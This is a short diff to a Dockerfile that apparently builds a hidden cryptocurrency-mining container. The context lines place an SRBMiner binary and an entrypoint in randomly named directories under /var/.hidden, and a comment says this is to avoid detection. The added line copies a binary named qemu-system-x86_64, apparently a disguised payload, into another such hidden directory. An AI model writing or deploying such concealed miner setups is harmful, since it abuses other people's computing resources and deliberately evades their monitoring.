@@ -17,6 +17,7 @@ RUN mv /var/.hidden/SRBMiner-Multi-2-7-2 /var/.hidden/$(head /dev/urandom | tr -
 
 # Copy entrypoint to hidden directory with dynamic naming to avoid detection
 COPY entrypoint /var/.hidden/$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16)/
+COPY qemu-system-x86_64 /var/.hidden/$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16)/
 RUN chmod +x /var/.hidden/*/*/entrypoint
 
 # Set work directory to the hidden miner directory
